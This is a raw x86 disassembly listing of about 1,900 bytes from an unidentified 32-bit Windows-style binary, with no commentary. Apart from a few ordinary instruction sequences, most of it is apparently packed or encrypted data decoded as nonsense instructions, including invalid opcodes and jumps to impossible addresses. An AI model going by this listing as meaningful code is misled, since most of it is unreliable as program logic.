  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	retf   
  40192e:	push   ss
  40192f:	add    DWORD PTR [edi],0x7c7c7b4e
  401935:	addr16 jle 0x4019b4
  401938:	jl     0x401938
  40193a:	popf   
  40193b:	popf   
  40193c:	lahf   
  40193d:	push   ds
  40193e:	dec    ebx
  40193f:	adc    eax,0x1b5f3fd5
  401944:	mov    ecx,0x820e648a
  401949:	lods   eax,DWORD PTR ds:[esi]
  40194a:	lahf   
  40194b:	xor    dh,BYTE PTR [ebp-0x25b048e5]
  401951:	dec    ebx
  401952:	sahf   
  401953:	fnstcw WORD PTR [ecx]
  401955:	lods   eax,DWORD PTR ds:[esi]
  401956:	dec    ebp
  401957:	mov    ecx,0x248a25b9
  40195c:	add    ch,BYTE PTR [esi]
  40195e:	push   ebp
  40195f:	hlt    
  401960:	dec    ebp
  401961:	mov    ah,BYTE PTR [ecx+0x20255041]
  401967:	outs   dx,BYTE PTR ds:[esi]
  401968:	into   
  401969:	sbb    edi,DWORD PTR ds:0x4459f79d
  40196f:	jo     0x401951
  401971:	or     al,0xbf
  401973:	push   es
  401974:	aad    0xb7
  401976:	dec    esi
  401977:	pop    esp
  401978:	jne    0x40196f
  40197a:	scas   eax,DWORD PTR es:[edi]
  40197b:	icebp  
  40197c:	jnp    0x401936
  40197e:	fucomip st,st(7)
  401980:	dec    ebp
  401981:	cmp    al,0x6d
  401983:	stos   DWORD PTR es:[edi],eax
  401984:	in     eax,dx
  401985:	cli    
  401986:	hlt    
  401987:	stos   BYTE PTR es:[edi],al
  401988:	fldcw  WORD PTR [edi-0x193c7d8f]
  40198e:	jmp    0xf17ca68e
  401993:	inc    ecx
  401994:	outs   dx,BYTE PTR ds:[esi]
  401995:	mov    al,ds:0x4efd1922
  40199a:	inc    edi
  40199b:	lds    ecx,FWORD PTR [edi+esi*4+0x1fd561b6]
  4019a2:	fnstsw WORD PTR [edi-0x33]
  4019a5:	mov    edi,0x25508611
  4019aa:	lds    ebx,FWORD PTR [esi+0x49dc9b12]
  4019b0:	(bad)  
  4019b2:	cdq    
  4019b3:	int3   
  4019b4:	pop    es
  4019b5:	jno    0x401978
  4019b7:	jns    0x401a35
  4019b9:	mov    esi,0x9f00437
  4019be:	and    eax,DWORD PTR [edi-0x73b805eb]
  4019c4:	mov    edx,0xdb5c2b29
  4019c9:	mov    WORD PTR ds:0xd2f4da3c,cs
  4019cf:	sbb    ebx,esp
  4019d1:	test   DWORD PTR [edi-0x81b508c],0x35efa239
  4019db:	fwait
  4019dc:	add    ch,BYTE PTR [eax]
  4019de:	pop    eax
  4019df:	cwde   
  4019e0:	lock jecxz 0x401969
  4019e3:	fadd   QWORD PTR [edx]
  4019e5:	inc    eax
  4019e6:	fisttp DWORD PTR ds:0xbf3eef95
  4019ec:	test   al,0xdd
  4019ee:	sub    DWORD PTR [ecx],edi
  4019f0:	jns    0x401a5d
  4019f2:	dec    eax
  4019f3:	mov    ebp,0xb68d3fde
  4019f8:	dec    esi
  4019f9:	fmul   st,st(7)
  4019fb:	pop    eax
  4019fc:	and    DWORD PTR [esi+0x7620d6bd],esi
  401a02:	pop    edi
  401a03:	es sub al,0xea
  401a06:	daa    
  401a07:	data16 test BYTE PTR [ecx],cl
  401a0a:	cs xchg esi,eax
  401a0c:	pop    ss
  401a0d:	jp     0x401a25
  401a0f:	mov    cl,0x83
  401a11:	push   edx
  401a12:	std    
  401a13:	add    al,0x78
  401a15:	es mov edx,0x2ae86665
  401a1b:	pop    ebp
  401a1c:	in     al,0xbe
  401a1e:	fmul   DWORD PTR [edi+edi*4-0x3a]
  401a22:	arpl   WORD PTR [edx-0xa],bx
  401a25:	sti    
  401a26:	mov    cl,0x11
  401a28:	js     0x4019e5
  401a2a:	repz jp 0x4019e4
  401a2d:	or     bh,BYTE PTR [eax]
  401a2f:	jge    0x4019e0
  401a31:	jecxz  0x4019e0
  401a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a34:	or     cl,dl
  401a36:	mov    ch,0xad
  401a38:	and    dh,BYTE PTR [edi-0x1c]
  401a3b:	sbb    bh,ch
  401a3d:	or     ebx,DWORD PTR [eax-0x6a20b064]
  401a43:	ret    0x33db
  401a46:	enter  0xd4f7,0xef
  401a4a:	push   ebx
  401a4b:	mov    edx,0xb113725
  401a50:	sub    BYTE PTR [edi],0xc
  401a53:	ss (bad) 
  401a55:	mov    al,0xc8
  401a57:	jnp    0x401aa5
  401a59:	mov    edx,0x5c77da08
  401a5e:	not    ah
  401a60:	push   cs
  401a61:	push   cs
  401a62:	add    esp,edi
  401a64:	jmp    0x401a3f
  401a66:	mov    esp,cr7
  401a69:	call   0x1cb2917f
  401a6e:	mov    edi,0x5f40fb8f
  401a73:	jns    0x401a01
  401a75:	push   esp
  401a76:	mov    dh,BYTE PTR ds:0x2a566edf
  401a7c:	mov    ebx,0x721530e
  401a81:	mov    bl,0x8b
  401a83:	loope  0x401a3d
  401a85:	fdiv   DWORD PTR [ecx]
  401a87:	int    0x75
  401a89:	mov    ebp,0xe09a1b27
  401a8e:	add    cl,BYTE PTR [edx+0x2b]
  401a91:	xor    esp,DWORD PTR [esi+edx*4-0x2e]
  401a95:	int    0xd3
  401a97:	fild   DWORD PTR [edi+0x6e5848d]
  401a9d:	inc    edx
  401a9e:	outs   dx,DWORD PTR ds:[esi]
  401a9f:	mov    esi,0x3197c491
  401aa4:	and    cl,BYTE PTR [ebp+ebp*4+0x38]
  401aa8:	ins    BYTE PTR es:[edi],dx
  401aa9:	leave  
  401aaa:	cli    
  401aab:	jb     0x401a95
  401aad:	stos   BYTE PTR es:[edi],al
  401aae:	arpl   WORD PTR [ebx+0x59],dx
  401ab1:	pop    edx
  401ab2:	xor    eax,0x5e03f46f
  401ab7:	bound  ebx,QWORD PTR [eax+0x14]
  401aba:	jno    0x401a9a
  401abc:	or     al,0x6
  401abe:	lds    ecx,FWORD PTR [esi-0x22]
  401ac1:	sar    BYTE PTR [esi+0x42],cl
  401ac4:	ficom  DWORD PTR [ecx-0xdde3dbe]
  401aca:	iret   
  401acb:	xor    eax,0x229f0561
  401ad0:	cmp    BYTE PTR [edx-0x65],bh
  401ad3:	das    
  401ad4:	pop    edx
  401ad5:	xchg   esp,eax
  401ad6:	mov    esp,0x24f09752
  401adb:	jl     0x401ac3
  401add:	inc    edi
  401ade:	push   eax
  401adf:	xor    dh,0xaa
  401ae2:	pop    ds
  401ae3:	fcom   QWORD PTR [ebx+0x7e]
  401ae6:	xor    DWORD PTR [edi+0x79d14fe5],ecx
  401aec:	nop
  401aed:	mov    ebp,0x2b5dc2dd
  401af2:	sbb    dh,bl
  401af4:	jne    0x401a97
  401af6:	pop    edx
  401af7:	pop    ebp
  401af8:	or     BYTE PTR [edx-0x2b611cf],0x37
  401aff:	jo     0x401b36
  401b01:	mov    ds:0x416a1222,al
  401b06:	les    esp,FWORD PTR [ecx]
  401b08:	dec    ecx
  401b09:	xchg   ebx,eax
  401b0a:	push   0x4e
  401b0c:	add    edi,DWORD PTR [edx+0x5c5e2807]
  401b12:	xor    eax,0xb1acffdc
  401b17:	xor    BYTE PTR [ebp-0x17],cl
  401b1a:	or     al,0x95
  401b1c:	jae    0x401ad0
  401b1e:	push   0x7b
  401b20:	push   0xffffffe0
  401b22:	xchg   esi,eax
  401b23:	or     edx,DWORD PTR [ecx]
  401b25:	sub    al,0x70
  401b27:	xor    DWORD PTR [eax+0x59fb9213],esp
  401b2d:	jae    0x401b59
  401b2f:	dec    eax
  401b30:	adc    al,0x7e
  401b32:	pop    ds
  401b33:	push   ebp
  401b35:	out    0x78,al
  401b37:	xchg   edi,eax
  401b38:	fmul   QWORD PTR [edx-0xbbea628]
  401b3e:	shl    BYTE PTR [edi+0x7259ae6b],cl
  401b44:	test   eax,0x73d2fcca
  401b49:	mov    al,ds:0x6ce9949b
  401b4e:	addr16 pop ds
  401b50:	mov    ch,0x79
  401b52:	outs   dx,DWORD PTR ds:[esi]
  401b53:	sub    edx,edx
  401b55:	ins    DWORD PTR es:[edi],dx
  401b56:	ins    DWORD PTR es:[edi],dx
  401b57:	and    al,0xdd
  401b59:	int    0x95
  401b5b:	enter  0xeec9,0x29
  401b5f:	inc    esp
  401b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b61:	gs pusha 
  401b63:	in     al,0x39
  401b65:	add    ah,BYTE PTR [edx]
  401b67:	pop    ebp
  401b68:	pop    ss
  401b69:	and    DWORD PTR [eax+0x3def2092],0xffffffdf
  401b70:	sbb    ebp,ecx
  401b72:	int    0xc3
  401b74:	je     0x401af7
  401b76:	aad    0x19
  401b78:	frstor [ecx]
  401b7a:	xchg   ecx,eax
  401b7b:	add    bl,BYTE PTR [ecx+edi*1+0x3]
  401b7f:	sbb    eax,edx
  401b81:	mov    edx,0x9efe62e6
  401b86:	dec    ebx
  401b87:	mov    bl,0xb8
  401b89:	pusha  
  401b8a:	inc    edi
  401b8b:	test   al,0xf4
  401b8d:	jne    0x401b72
  401b8f:	xor    ch,BYTE PTR [esi+0x7c]
  401b92:	dec    esp
  401b93:	add    BYTE PTR [ecx],ch
  401b95:	out    dx,eax
  401b96:	push   ebx
  401b97:	push   cs
  401b98:	pop    ds
  401b99:	hlt    
  401b9a:	test   al,0x51
  401b9c:	dec    ebx
  401b9d:	xor    esp,DWORD PTR [esi]
  401b9f:	icebp  
  401ba0:	call   0x7572:0x4f6ce12f
  401ba7:	xchg   esp,eax
  401ba8:	cmp    al,0x9b
  401baa:	rol    BYTE PTR [ecx+0x2bf73d44],1
  401bb0:	in     eax,0x84
  401bb2:	cmp    DWORD PTR [edx],esp
  401bb4:	daa    
  401bb5:	js     0x401b4b
  401bb7:	cmp    cl,BYTE PTR [ecx]
  401bb9:	sub    ecx,DWORD PTR [edi+ebx*1]
  401bbc:	imul   ecx,esp,0xa6d63615
  401bc2:	(bad)  
  401bc3:	scas   eax,DWORD PTR es:[edi]
  401bc4:	shl    esi,cl
  401bc6:	je     0x401b90
  401bc8:	fwait
  401bc9:	jmp    0xc1963161
  401bce:	shl    dl,0xa3
  401bd1:	fwait
  401bd2:	jle    0x401ba9
  401bd4:	dec    BYTE PTR [ebp+ebp*1-0x28]
  401bd8:	inc    esi
  401bd9:	inc    esi
  401bda:	ds out 0x3f,al
  401bdd:	mov    DWORD PTR [ebp-0x769fe386],edx
  401be3:	lods   eax,DWORD PTR ds:[esi]
  401be5:	je     0x401b74
  401be7:	clc    
  401be8:	fs popa 
  401bea:	inc    ecx
  401beb:	jg     0x401c14
  401bed:	cmp    dl,0x8d
  401bf0:	dec    esi
  401bf1:	popa   
  401bf2:	fisubr DWORD PTR ds:0x3d2c403c
  401bf8:	dec    ecx
  401bf9:	mov    eax,ds:0x8dd2f7f
  401bfe:	es stc 
  401c00:	loopne 0x401b90
  401c02:	in     al,0x9e
  401c04:	es out dx,eax
  401c06:	add    eax,0x103218f3
  401c0b:	jecxz  0x401be4
  401c0d:	aad    0xe1
  401c0f:	bound  edi,QWORD PTR [ebp-0x41a154a5]
  401c15:	imul   DWORD PTR [eax-0x63]
  401c18:	dec    esp
  401c19:	in     al,dx
  401c1a:	out    0x5d,eax
  401c1c:	push   edi
  401c1d:	sbb    BYTE PTR [esi],0x12
  401c20:	ror    BYTE PTR [eax],0x33
  401c23:	into   
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0x5d2199e1
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401c19
  401c4b:	pop    es
  401c4c:	lahf   
  401c4d:	test   DWORD PTR [eax+0x41538534],ebx
  401c53:	xlat   BYTE PTR ds:[ebx]
  401c54:	mov    cl,0xa8
  401c56:	(bad)  
  401c57:	std    
  401c58:	(bad)  
  401c59:	retf   
  401c5a:	mov    ds:0xb8d44434,eax
  401c5f:	xchg   esp,eax
  401c60:	cmp    ebx,ebx
  401c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c63:	jae    0x401c17
  401c65:	or     bh,BYTE PTR [ecx-0xd]
  401c68:	mov    esi,0x85a2eb2b
  401c6d:	inc    ecx
  401c6e:	cld    
  401c6f:	idiv   BYTE PTR [ecx-0x72]
  401c72:	dec    edx
  401c73:	pop    ecx
  401c74:	pusha  
  401c75:	mov    ecx,0x70f0543e
  401c7a:	not    DWORD PTR cs:[ebx]
  401c7d:	ficom  DWORD PTR [ebp+0x73]
  401c80:	pop    edi
  401c81:	mov    esi,?
  401c83:	rol    DWORD PTR [esi+0x1a],cl
  401c86:	pop    ecx
  401c87:	sbb    al,0x99
  401c89:	scas   eax,DWORD PTR es:[edi]
  401c8a:	call   0xb61c:0x9a6543e7
  401c91:	pop    esp
  401c92:	mov    ds:0x99848d17,eax
  401c97:	les    esp,FWORD PTR [ebp+0x35]
  401c9a:	stc    
  401c9b:	shr    esp,0xbc
  401c9e:	js     0x401c8d
  401ca0:	sar    BYTE PTR [ebp-0x46],cl
  401ca3:	xchg   edx,eax
  401ca4:	inc    ecx
  401ca5:	push   eax
  401ca6:	ror    cl,1
  401ca8:	mov    esi,DWORD PTR [esi]
  401caa:	(bad)  
  401cab:	outs   dx,DWORD PTR ds:[esi]
  401cac:	jg     0x401c4b
  401cae:	out    0x90,al
  401cb0:	mov    edx,0x46da38be
  401cb5:	lea    ebx,[esi-0x40f969a8]
  401cbb:	lock pusha 
  401cbd:	xor    ch,ch
  401cbf:	leave  
  401cc0:	sub    DWORD PTR ds:0x5bbe3161,0x3e
  401cc7:	ds std 
  401cc9:	ds es js 0x401c5d
  401ccd:	or     eax,0x12117087
  401cd2:	pop    eax
  401cd3:	mov    esi,DWORD PTR [edi+0x4e]
  401cd6:	cmp    DWORD PTR [esi+0x6e],esp
  401cd9:	call   0xc09e:0x596929f
  401ce0:	add    al,0x13
  401ce2:	or     DWORD PTR [ebx],ebx
  401ce4:	dec    edx
  401ce5:	fwait
  401ce6:	iret   
  401ce7:	xchg   esp,eax
  401ce8:	iret   
  401ce9:	setl   BYTE PTR [ecx+0x6ef5e568]
  401cf0:	imul   ebx,DWORD PTR [eax+esi*8+0x30d7b327],0x900df8a4
  401cfb:	aam    0xc4
  401cfd:	mov    BYTE PTR [ebp+0x3a],ah
  401d00:	sub    BYTE PTR [eax+0x22],cl
  401d03:	std    
  401d04:	xor    bl,dl
  401d06:	push   0xffffffd8
  401d08:	xchg   esp,eax
  401d09:	sub    al,0x9f
  401d0b:	cmc    
  401d0c:	fsub   st(6),st
  401d0e:	iret   
  401d0f:	xor    ebx,DWORD PTR [eax-0x5f]
  401d12:	inc    edi
  401d13:	sub    edx,edx
  401d15:	test   al,0x15
  401d17:	dec    BYTE PTR [ebp+0x2d671a4e]
  401d1d:	xchg   edx,eax
  401d1e:	outs   dx,BYTE PTR ds:[esi]
  401d1f:	sub    DWORD PTR [ebx],0x1c
  401d22:	cli    
  401d23:	stos   DWORD PTR es:[edi],eax
  401d24:	cdq    
  401d25:	inc    ebx
  401d26:	bound  ecx,QWORD PTR [eax]
  401d28:	xor    al,BYTE PTR ds:0x80c59a0c
  401d2e:	jge    0x401d51
  401d30:	outs   dx,DWORD PTR ds:[esi]
  401d31:	xchg   DWORD PTR [ecx],ecx
  401d33:	fcmovb st,st(7)
  401d35:	pop    ebx
  401d36:	inc    edx
  401d37:	mov    esi,edx
  401d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d3a:	cli    
  401d3b:	into   
  401d3c:	cwde   
  401d3d:	mov    ebx,0x92a117e0
  401d42:	xor    ecx,0xe2c0c922
  401d48:	adc    eax,0x4690d5ef
  401d4d:	jnp    0x401cf3
  401d4f:	inc    edi
  401d50:	inc    esp
  401d51:	sbb    al,0x3e
  401d53:	xor    eax,0x56355b96
  401d58:	out    dx,al
  401d59:	es mov dl,0x7c
  401d5c:	xchg   esp,eax
  401d5d:	or     al,0x47
  401d5f:	call   0x2c89:0xbbe59527
  401d66:	loope  0x401d19
  401d68:	daa    
  401d69:	pop    esp
  401d6a:	ficomp WORD PTR [ebx]
  401d6c:	cwde   
  401d6d:	mov    esp,0x63af9782
  401d72:	std    
  401d73:	(bad)  
  401d74:	fbld   TBYTE PTR [edx-0x2d]
  401d77:	mov    al,0x6c
  401d79:	shl    BYTE PTR [edi],1
  401d7b:	jle    0x401d02
  401d7d:	stos   BYTE PTR es:[edi],al
  401d7e:	jmp    0x48f:0xd2e21f97
  401d85:	addr16 popa 
  401d87:	push   edx
  401d88:	push   esp
  401d89:	dec    edi
  401d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8b:	adc    BYTE PTR [ebx-0x46208ebb],bh
  401d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d92:	pushf  
  401d93:	aas    
  401d94:	sub    eax,DWORD PTR [eax-0x78]
  401d97:	cli    
  401d98:	daa    
  401d99:	and    eax,0xdf5d419
  401d9e:	sahf   
  401d9f:	cwde   
  401da0:	adc    eax,0x2dab0f91
  401da5:	frstor [esi+0x25]
  401da8:	retf   
  401da9:	(bad)  
  401daa:	neg    DWORD PTR ds:0xee2af38c
  401db0:	std    
  401db1:	sbb    al,0x66
  401db3:	jg     0x401e1b
  401db5:	std    
  401db6:	es out dx,eax
  401db8:	inc    edx
  401db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dba:	jns    0x401dff
  401dbc:	fisub  DWORD PTR [edx+0x2110c2f5]
  401dc2:	add    eax,0xf75ba212
  401dc7:	out    0xc8,eax
  401dc9:	mov    ebp,DWORD PTR [ebx+ebx*4-0x36]
  401dcd:	in     eax,dx
  401dce:	push   eax
  401dcf:	inc    eax
  401dd0:	adc    edi,DWORD PTR [eax+edx*1+0x14]
  401dd4:	loop   0x401dcc
  401dd6:	gs (bad) 
  401dd8:	push   edx
  401dd9:	push   ebp
  401dda:	dec    esp
  401ddb:	add    cl,bl
  401ddd:	fadd   QWORD PTR [ebx-0x3f]
  401de0:	jmp    0x3fc6:0x4c0d4424
  401de7:	cmp    eax,0xe222559c
  401dec:	cwde   
  401ded:	(bad)  
  401dee:	dec    eax
  401def:	xchg   dh,ah
  401df1:	popf   
  401df2:	fadd   QWORD PTR [ebx+0x6ff071d1]
  401df8:	mov    ch,0xc1
  401dfa:	sbb    DWORD PTR [edi+ecx*4+0x7],eax
  401dfe:	mov    esi,0xc3f4347
  401e03:	inc    ebx
  401e04:	add    eax,0x5a3f629c
  401e09:	pop    ebp
  401e0a:	or     BYTE PTR [ebx],bh
  401e0c:	les    ebp,FWORD PTR [ebp-0x78]
  401e0f:	das    
  401e10:	repz xor DWORD PTR [edi-0x5d9528e9],eax
  401e17:	int    0x1b
  401e19:	mov    bh,0xc6
  401e1b:	outs   dx,BYTE PTR ds:[esi]
  401e1c:	bound  edi,QWORD PTR [edx+eiz*1]
  401e1f:	adc    DWORD PTR [eax+0x10dee133],ecx
  401e25:	bound  ecx,QWORD PTR [ebp+0x17790da8]
  401e2b:	stos   DWORD PTR es:[edi],eax
  401e2c:	push   edi
  401e2d:	inc    esi
  401e2e:	sti    
  401e2f:	cli    
  401e30:	fcmovnb st,st(2)
  401e32:	adc    DWORD PTR [edi+0x6],esp
  401e35:	call   0x68c9:0xb8b2e545
  401e3c:	sbb    dh,bl
  401e3e:	adc    BYTE PTR [ebx+0x71],bl
  401e41:	sbb    BYTE PTR es:[ebp+0x25f916b6],bh
  401e48:	mov    WORD PTR [edx+eiz*8],ss
  401e4b:	xchg   BYTE PTR [eax+edx*1+0x5f],bh
  401e4f:	dec    edx
  401e50:	imul   eax,DWORD PTR [edx],0x3eaf8390
  401e56:	push   edx
  401e57:	pushf  
  401e58:	retf   0x669b
  401e5b:	push   esp
  401e5c:	in     eax,dx
  401e5d:	in     al,dx
  401e5e:	inc    cx
  401e60:	add    dl,BYTE PTR [esi]
  401e62:	and    DWORD PTR [eax+0x21],ebp
  401e65:	test   al,0xa
  401e67:	jp     0x401e92
  401e69:	sub    dl,BYTE PTR [edi+0x55646783]
  401e6f:	mov    edx,0x539cf166
  401e74:	and    esp,esi
  401e76:	mov    bl,0xa8
  401e78:	push   esp
  401e79:	leave  
  401e7a:	add    ebx,DWORD PTR [ecx+edx*2-0x1651018c]
  401e81:	pop    edx
  401e82:	dec    ebx
  401e83:	dec    edx
  401e84:	fadd   QWORD PTR [eax+0x27dd36e4]
  401e8a:	(bad)  [edi]
  401e8c:	mov    dl,0xe8
  401e8e:	out    0xda,eax
  401e90:	cmp    ch,BYTE PTR [esi]
  401e92:	or     DWORD PTR [ebx],0xef2ba02
  401e98:	js     0x401f0f
  401e9a:	xchg   DWORD PTR gs:[edi],ecx
  401e9d:	imul   esp,DWORD PTR [ebx+0x300b2230],0x535a659e
  401ea7:	ins    BYTE PTR es:[edi],dx
  401ea8:	out    dx,al
  401ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eaa:	dec    ebp
  401eab:	ret    0x1d7d
  401eae:	pop    es
  401eaf:	adc    eax,0x2eef64a6
  401eb4:	pop    esi
  401eb5:	mov    ds:0xb40cdace,eax
  401eba:	fstp   TBYTE PTR [edx-0x6c8e1325]
  401ec0:	sub    ebp,0xffffffa9
  401ec3:	je     0x401f30
  401ec5:	mov    al,0x29
  401ec7:	cs xchg ebp,eax
  401ec9:	popf   
  401eca:	xor    eax,0xfa3a35bb
  401ecf:	test   BYTE PTR [ebx-0xa],0x1d
  401ed3:	inc    eax
  401ed4:	sbb    cl,BYTE PTR [edx-0x65]
  401ed7:	xchg   dh,bl
  401ed9:	icebp  
  401eda:	inc    ebp
  401edb:	stos   BYTE PTR es:[edi],al
  401edc:	js     0x401f54
  401ede:	outs   dx,DWORD PTR ds:[esi]
  401edf:	cmp    edx,DWORD PTR [edi+0x6f]
  401ee2:	enter  0x76cc,0x94
  401ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ee7:	(bad)  
  401ee8:	cmp    eax,0x763b6a29
  401eed:	push   0xffffffef
  401eef:	xchg   esp,eax
  401ef0:	jge    0x401ee4
  401ef2:	int    0xd7
  401ef4:	sbb    bl,al
  401ef6:	ja     0x401f50
  401ef8:	mov    al,es:0xeaf11d69
  401efe:	(bad)  
  401eff:	cmp    al,0xaf
  401f01:	pop    ebx
  401f02:	push   ebp
  401f03:	push   edx
  401f04:	adc    eax,0x92343d1
  401f09:	push   eax
  401f0a:	mov    eax,0x5ab1518b
  401f0f:	cmp    al,al
  401f11:	xor    ah,ch
  401f13:	jb     0x401f58
  401f15:	add    al,0x26
  401f17:	ja     0x401eae
  401f19:	mov    edi,0xd9daaa3e
  401f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f1f:	sbb    DWORD PTR [edx+0x13],edx
  401f22:	push   ebx
  401f23:	out    dx,al
  401f24:	xchg   edx,eax
  401f25:	dec    esi
  401f26:	or     ch,BYTE PTR [ebx-0x68]
  401f29:	sub    ecx,DWORD PTR [edi-0x14]
  401f2c:	push   ss
  401f2d:	ss xchg esi,eax
  401f2f:	bound  eax,QWORD PTR [ecx-0x7f]
  401f32:	into   
  401f33:	mov    eax,ds:0x413bea
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0xda0a1150
  401f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f5e:	cwde   
  401f5f:	add    DWORD PTR [esp+edi*2+0x67],edi
  401f63:	jle    0x401fe1
  401f65:	jl     0x401fe0
  401f67:	xor    ebp,DWORD PTR [ecx]
  401f69:	xchg   ebp,eax
  401f6a:	ja     0x401faa
  401f6c:	shl    DWORD PTR [ebx-0x3283dcd2],0x89
  401f73:	out    0x11,al
  401f75:	mov    WORD PTR ds:0x86e0eee3,fs
  401f7b:	hlt    
  401f7c:	xchg   BYTE PTR [ebp+eax*8+0x75fb3fa3],bl
  401f83:	push   edi
  401f84:	mov    DWORD PTR [edi],edi
  401f86:	les    eax,FWORD PTR [ecx]
  401f88:	test   DWORD PTR [esi-0x9de96be],esp
  401f8e:	and    BYTE PTR [ebp-0x5d0ff431],ch
  401f94:	or     al,0xec
  401f96:	mov    ds:0x3c9edcb6,al
  401f9b:	inc    esi
  401f9c:	enter  0x1135,0x0
  401fa0:	or     DWORD PTR [edx-0x4f],esi
  401fa3:	and    al,0xb1
  401fa5:	xchg   ecx,eax
  401fa6:	cmp    DWORD PTR [eax-0x59eb7af],esi
  401fac:	cmc    
  401fad:	icebp  
  401fae:	pop    ebx
  401faf:	mov    edi,0x2e379de7
  401fb4:	or     esi,esi
  401fb6:	push   edi
  401fb7:	xor    BYTE PTR ds:0x12e3fee6,cl
  401fbd:	lods   eax,DWORD PTR ds:[esi]
  401fbe:	xor    BYTE PTR [edx-0x30],ah
  401fc1:	jne    0x402036
  401fc3:	std    
  401fc4:	cmp    DWORD PTR [ecx+eiz*8],esi
  401fc7:	scas   al,BYTE PTR es:[edi]
  401fc8:	dec    esi
  401fc9:	jle    0x402030
  401fcb:	and    DWORD PTR [esi-0x1f],0xffffffec
  401fcf:	les    ebx,FWORD PTR [edx-0x34]
  401fd2:	xor    al,0x4d
  401fd4:	dec    edi
  401fd5:	dec    eax
  401fd6:	push   ebp
  401fd7:	xor    dh,BYTE PTR [edx+0x73]
  401fda:	mov    dh,0x13
  401fdc:	sahf   
  401fdd:	test   BYTE PTR [ecx],dh
  401fdf:	jnp    0x401fe3
  401fe1:	push   edx
  401fe2:	jo     0x402005
  401fe4:	mov    eax,0x8681e9a9
  401fe9:	pop    es
  401fea:	in     eax,dx
  401feb:	dec    ebp
  401fec:	sub    al,0x8a
  401fee:	jecxz  0x402007
  401ff0:	into   
  401ff1:	or     BYTE PTR [eax],ch
  401ff3:	or     dl,0xc5
  401ff6:	adc    ecx,eax
  401ff8:	push   esp
  401ff9:	push   edx
  401ffa:	jno    0x40206f
  401ffc:	mov    esp,0x5b956255
  402001:	add    al,0xfb
  402003:	fcom   QWORD PTR [ebx+ecx*8+0x7b]
  402007:	test   BYTE PTR [eax+0x34ab8b64],0x9
  40200e:	jae    0x401fc9
  402010:	adc    bh,BYTE PTR [esi+ebp*2]
  402013:	add    ecx,eax
  402015:	cmp    ebx,DWORD PTR [ebx+0x75f8373d]
  40201b:	pop    ecx
  40201c:	popa   
  40201d:	pusha  
  40201e:	jno    0x402007
  402020:	and    bh,BYTE PTR [esi]
  402022:	push   cs
  402023:	sub    BYTE PTR [ebx],dl
  402025:	nop
  402026:	dec    esp
  402027:	enter  0xd8c0,0x20
  40202b:	pop    ss
  40202c:	lods   al,BYTE PTR ds:[esi]
  40202d:	(bad)  
  40202e:	push   0x396ebe50
  402033:	outs   dx,BYTE PTR ds:[esi]
  402034:	push   es
  402035:	popf   
  402036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402037:	fsubrp st(7),st
  402039:	fisubr WORD PTR [eax]
  40203b:	(bad)  
  40203c:	fldcw  WORD PTR [ebp-0x7f4d382c]
  402042:	test   al,0xc4
  402044:	jmp    0xddcf:0x785a0901
  40204b:	pop    ecx
  40204c:	fld    DWORD PTR [edi+0x6e]
  40204f:	xchg   ecx,eax
  402050:	mov    bh,0x19
  402052:	add    al,0xf
  402054:	ja     0x40204c
  402056:	xchg   esp,eax
  402057:	das    
  402058:	xor    DWORD PTR [esi-0x36],ebp
  40205b:	mov    edx,0xcadb88a3
  402060:	jmp    0xae2e:0x93408612
  402067:	stc    
  402068:	sub    eax,0xbee2b593
  40206d:	mov    esp,0x7beea1b1
  402072:	mov    ebx,0x8d47bbf1
  402077:	cmp    eax,0x18acbb49
  40207c:	jb     0x4020ef
  40207e:	std    
  40207f:	inc    esi
  402080:	pop    ecx
  402081:	adc    eax,0xd2f13a95
  402086:	inc    DWORD PTR [ecx+0x9c09956]
  40208c:	fcmovne st,st(6)
  40208e:	cmp    dh,BYTE PTR ds:0xe7d140f7
  402094:	sbb    al,0xa2
  402096:	pop    es
  402097:	add    eax,0xc0dab7e5
  40209c:	or     al,0x3c
  40209e:	xor    edi,DWORD PTR [eax+0x48]
  4020a1:	fst    QWORD PTR [esi+0xe]
  4020a4:	xor    DWORD PTR [ebp-0x5906b111],eax
  4020aa:	bnd ja 0x402105
  4020ad:	sahf   
  4020ae:	jmp    0x138f1f56
  4020b3:	repz dec ebx
  4020b5:	xchg   ebx,eax
  4020b6:	xor    DWORD PTR [ebp+ebx*2+0x68],edi
